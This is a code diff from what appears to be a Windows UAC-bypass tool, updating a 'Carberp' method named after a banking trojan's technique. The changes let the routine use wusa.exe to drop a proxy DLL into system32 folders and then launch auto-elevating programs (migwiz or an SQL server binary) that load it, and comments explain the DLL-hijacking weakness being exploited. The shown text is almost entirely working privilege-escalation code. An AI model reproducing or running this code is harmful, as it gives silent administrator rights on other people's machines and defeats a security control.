@@ -4,11 +4,11 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     1.20
+*  VERSION:     1.30
 *
-*  DATE:        29 Mar 2015
+*  DATE:        30 Mar 2015
 *
-*  Tweaked Carberp method with migwiz as dll hijacking target.
+*  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
 *
 * THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
@@ -28,11 +28,13 @@
 *
 */
 BOOL ucmWusaMethod(
+	DWORD dwType,
 	PVOID ProxyDll,
 	DWORD ProxyDllSize
 	)
 {
 	BOOL bResult = FALSE, cond = FALSE;
+	LPWSTR lpSourceDll, lpMsuPackage, lpCommandLine, lpTargetProcess;
 	WCHAR szDllFileName[MAX_PATH + 1];
 	WCHAR szMsuFileName[MAX_PATH + 1];
 	WCHAR szCmd[MAX_PATH * 4];
@@ -40,15 +42,35 @@ BOOL ucmWusaMethod(
 	RtlSecureZeroMemory(szDllFileName, sizeof(szDllFileName));
 	RtlSecureZeroMemory(szMsuFileName, sizeof(szMsuFileName));
 
+	switch (dwType) {
+
+	case METHOD_CARBERP:
+		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
+		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
+		lpCommandLine = METHOD_MIGWIZ_CMDLINE;
+		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
+		break;
+
+	case METHOD_CARBERP_EX:
+		lpSourceDll = METHOD_SQLSVR_SOURCEDLL;
+		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
+		lpCommandLine = METHOD_SQLSVR_CMDLINE;
+		lpTargetProcess = METHOD_SQLSVR_TARGETAPP;
+		break;
+
+	default:
+		return FALSE;
+	}
+
 	do {
 
-		if (ExpandEnvironmentStringsW(L"%temp%\\wdscore.dll",
+		if (ExpandEnvironmentStringsW(lpSourceDll,
 			szDllFileName, MAX_PATH) == 0)
 		{
 			break;
 		}
 
-		if (ExpandEnvironmentStringsW(L"%temp%\\wdscore.msu",
+		if (ExpandEnvironmentStringsW(lpMsuPackage,
 			szMsuFileName, MAX_PATH) == 0)
 		{
 			break;
@@ -72,16 +94,15 @@ BOOL ucmWusaMethod(
 		// Target is migwiz because it has manifest with access = HighestAvailable and 
 		// it is vulnerable to delay load dll attack.
 		//
-
 		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		wsprintfW(szCmd, L"/c wusa %ws /extract:%%windir%%\\system32\\migwiz", szMsuFileName);
+		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
 		if (!supRunProcess(L"cmd.exe", szCmd)) {
 			OutputDebugString(TEXT("[UCM] Wusa failed"));
 			break;
 		}
 
 		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
-		if (ExpandEnvironmentStringsW(L"%systemroot%\\system32\\migwiz\\migwiz.exe",
+		if (ExpandEnvironmentStringsW(lpTargetProcess,
 			szCmd, MAX_PATH) == 0)
 		{
 			break;
